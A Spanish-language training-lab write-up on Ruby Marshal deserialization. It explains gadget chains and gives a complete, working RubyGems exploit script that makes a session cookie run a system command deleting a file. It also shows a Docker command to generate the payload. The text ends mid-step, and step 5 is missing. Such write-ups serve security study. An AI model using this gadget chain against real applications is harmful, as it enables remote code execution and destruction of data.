# 🧬 Deserialización Ruby con gadget documentado

## 📄 Descripción del laboratorio

Este laboratorio utiliza **serialización Ruby mediante Marshal** para gestionar el estado de sesión del usuario.\
El servidor toma el valor de una cookie, lo decodifica y lo deserializa utilizando `Marshal.load()`.

Existen **gadget chains documentadas en Ruby y RubyGems** que permiten ejecutar comandos del sistema durante el proceso de deserialización.

🎯 **Objetivo del laboratorio:**

* Generar un objeto Ruby serializado malicioso
* Inyectarlo en la cookie de sesión
* Conseguir que el servidor ejecute el comando que elimine:

```
/home/carlos/morale.txt
```

Credenciales iniciales:

```
wiener : peter
```



## 📚 Teoría

En aplicaciones Ruby on Rails es habitual almacenar datos de sesión utilizando **Marshal**, el formato binario de serialización nativo de Ruby.

Un flujo vulnerable típico sería:

```
1. El servidor recibe el valor de la cookie
2. Decodifica el valor (normalmente Base64)
3. Ejecuta Marshal.load() sobre los datos
```

Ejemplo conceptual:

```
Marshal.load(Base64.decode64(cookie))
```

Si el atacante controla los datos serializados, puede construir una **POP chain (Property-Oriented Programming)** que desencadene llamadas a métodos peligrosos.

### 📌 Gadget chains en Ruby

Ruby y RubyGems incluyen clases que pueden usarse para construir gadgets, por ejemplo:

```
Gem::Requirement
Gem::SpecFetcher
Gem::Installer
Net::WriteAdapter
```

Estas clases pueden encadenarse para terminar invocando:

```
Kernel.system
```

Esto permite ejecutar comandos del sistema operativo durante la deserialización.

Un gadget clásico encadena objetos de RubyGems y `Net::WriteAdapter` para terminar ejecutando un comando controlado por el atacante.



## 📝 Práctica

### 1️⃣ Iniciar sesión y localizar la cookie

Iniciamos sesión con:

```
wiener : peter
```

Interceptamos una petición autenticada con **Burp Suite** y localizamos la cookie de sesión.

El valor suele ser una cadena larga con caracteres típicos de Base64:

```
A-Za-z0-9+/=
```



### 2️⃣ Confirmar que se usa Marshal

Copiamos el valor de la cookie y lo enviamos a **Burp Decoder**.

Aplicamos:

```
Base64 decode
```

Si la cookie contiene un objeto Marshal, el resultado binario suele comenzar con:

```
\x04\x08
```

Esto confirma que el backend está utilizando **Marshal.load()** para deserializar el contenido.



### 3️⃣ Preparar el generador de payload

Para generar el payload utilizamos un gadget documentado basado en RubyGems.

Creamos un script llamado `exploit.rb`.

```
#!/usr/bin/ruby
require 'base64'

Gem::SpecFetcher
Gem::Installer

module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

puts Base64.encode64(payload)
```

Este script genera un objeto Marshal que ejecuta:

```
rm /home/carlos/morale.txt
```



### 4️⃣ Generar el payload

Si el script falla con versiones modernas de Ruby, es recomendable usar un entorno compatible.

Ejemplo con Docker:

```
docker run -it --rm -v "$PWD":/app -w /app ruby:2.7 ruby exploit.rb
```

### 6️⃣ Ejecución en el servidor

Cuando el servidor procesa la petición:

```
1. Lee la cookie
```
